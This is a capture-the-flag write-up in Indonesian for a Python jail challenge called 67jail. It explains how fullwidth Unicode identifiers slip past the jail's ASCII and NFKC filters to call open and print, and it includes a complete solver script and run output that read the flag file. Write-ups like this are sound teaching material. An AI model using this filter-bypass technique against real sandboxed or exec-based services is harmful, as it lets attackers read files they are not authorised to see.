# Writeup CTF Misc — 67jail

## Informasi Challenge

**Judul:** 67jail
**Kategori:** Misc / Python Jail
**Deskripsi:**

```
67676767
nc chal.thjcc.org 9000
```

Target challenge adalah keluar dari batasan Python jail dan membaca flag.

## Source Code

Diberikan file `jail.py`:

```python
#!/usr/bin/env python3
import unicodedata
banned = {"print": print, "open": open, "chr": chr}

s = input(">> ")

if len(s) != 6767:
    exit("wrong length :(")

if any(c in s for c in "'\"_`\\#"):
    exit("that's not good :(")

if any(c.isascii() and c.isalnum() for c in s):
    exit("no no no!!!")

if s.count(";") > 1:
    exit("too many semicolons!")

for c in s:
    if c.isidentifier() and unicodedata.normalize("NFKC", c) == c:
        exit("bad:(((")

exec(s, {"__builtins__": banned}, {})
```

## Analisis

Program meminta input dengan panjang tepat `6767` karakter. Beberapa karakter dilarang, seperti quote, underscore, backslash, dan karakter ASCII alphanumeric. Selain itu, karakter yang merupakan identifier dan tidak berubah setelah normalisasi Unicode NFKC juga ditolak.

Builtins yang tersedia hanya:

```python
print
open
chr
```

Artinya, jika kita bisa memanggil `print`, `open`, dan `chr`, kita bisa membaca file flag.

Masalah utamanya adalah input tidak boleh mengandung huruf ASCII seperti:

```python
print
open
chr
```

Namun Python mendukung identifier Unicode. Beberapa karakter Unicode seperti fullwidth alphabet akan dinormalisasi oleh parser Python menjadi huruf ASCII biasa. Contohnya:

```python
ｐｒｉｎｔ
```

akan diperlakukan sebagai:

```python
print
```

Karakter fullwidth ini lolos dari pengecekan ASCII karena bukan ASCII alphanumeric. Selain itu, karakter tersebut berubah ketika dinormalisasi NFKC, sehingga tidak terkena filter:

```python
unicodedata.normalize("NFKC", "ｐ") == "p"
```

Jadi kita dapat memakai fullwidth Unicode untuk memanggil fungsi bawaan.

## Strategi Eksploitasi

Payload yang dibutuhkan secara konsep:

```python
a=()==();print(open("/flag").read())
```

Namun karena karakter ASCII alphanumeric dan quote dilarang, payload dibuat menggunakan Unicode fullwidth dan `chr()`.

Pertama, kita butuh membuat angka tanpa digit ASCII. Caranya:

```python
ａ=()==()
```

Ekspresi `()==()` bernilai `True`. Dalam Python, `True` dapat dipakai sebagai angka `1`.

Jadi untuk membuat angka, kita bisa menjumlahkan `ａ` berkali-kali:

```python
ａ+ａ+ａ
```

Itu bernilai `3`.

Kemudian string seperti `/flag` dibuat menggunakan `chr()`:

```python
chr(47) + chr(102) + chr(108) + chr(97) + chr(103)
```

Tetapi `chr` juga harus ditulis sebagai fullwidth:

```python
ｃｈｒ(...)
```

Akhirnya payload membaca file `/flag`:

```python
ａ=()==();ｐｒｉｎｔ(ｏｐｅｎ(ｃｈｒ(...)+...).ｒｅａｄ())
```

Payload kemudian dipadding dengan spasi sampai panjangnya tepat `6767`.

## Solver

Script berikut digunakan untuk membuat payload otomatis dan mencoba beberapa lokasi flag:

```python
#!/usr/bin/env python3
import os, re, socket, unicodedata, sys

HOST, PORT = "chal.thjcc.org", 9000
TOKEN = os.environ.get("TOKEN", "")

FW = str.maketrans(
    "abcdefghijklmnopqrstuvwxyz",
    "ａｂｃｄｅｆｇｈｉｊｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚ"
)

def fw(s):
    return s.translate(FW)

A = fw("a")

def num(n):
    return "+".join([A] * n)

def ch(n):
    return fw("chr") + "(" + num(n) + ")"

def sexpr(s):
    return "+".join(ch(ord(c)) for c in s)

def make_payload(path):
    p = f"{A}=()==();{fw('print')}({fw('open')}({sexpr(path)}).{fw('read')}())"

    if len(p) > 6767:
        raise ValueError((path, len(p)))

    p += " " * (6767 - len(p))

    assert len(p) == 6767
    assert not any(c in p for c in "'\"_`\\#")
    assert not any(c.isascii() and c.isalnum() for c in p)
    assert p.count(";") <= 1
    assert not any(c.isidentifier() and unicodedata.normalize("NFKC", c) == c for c in p)

    return p

def recv_until(sock, marker, timeout=6):
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        try:
            part = sock.recv(4096)
        except socket.timeout:
            break
        if not part:
            break
        data += part
    return data

def attempt(path):
    payload = make_payload(path)

    s = socket.create_connection((HOST, PORT), timeout=8)

    data = recv_until(s, b"token:")
    s.sendall((TOKEN + "\n").encode())

    data += recv_until(s, b"your chosen")
    s.sendall(b"3\n")

    data += recv_until(s, b"nonce:")
    nums = re.findall(rb"\b\d{4,}\b", data)

    if not nums:
        print("[!] nonce not found")
        print(data.decode(errors="ignore")[-500:])
        return False

    s.sendall(nums[-1] + b"\n")

    data = recv_until(s, b">>")
    s.sendall(payload.encode() + b"\n")

    out = b""
    s.settimeout(5)

    while True:
        try:
            part = s.recv(4096)
            if not part:
                break
            out += part
        except socket.timeout:
            break

    txt = out.decode(errors="ignore")
    m = re.search(r"THJCC\{[^}]+\}", txt)

    if m:
        print("[HIT]", path)
        print(m.group(0))
        return True

    print("[MISS]", path)
    print(txt[-250:])
    return False

if not TOKEN:
    print("Set TOKEN dulu: export TOKEN='ctfd_xxx'")
    sys.exit(1)

candidates = [
    "flag.txt",
    "flag",
    "/flag.txt",
    "/flag",
    "FLAG",
    "/app/flag.txt",
    "/home/ctf/flag.txt",
    "/home/ctf/flag",
]

for path in candidates:
    if attempt(path):
        break
```

## Eksekusi

Command yang digunakan:

```bash
export TOKEN='ctfd_...'
python3 solve67.py
```

Output:

```text
[MISS] flag.txt
bye~

[MISS] flag
bye~

[MISS] /flag.txt
bye~

[HIT] /flag
THJCC{676767676767676767676767676767676767676767676767}
```

## Flag

```text
THJCC{676767676767676767676767676767676767676767676767}
```
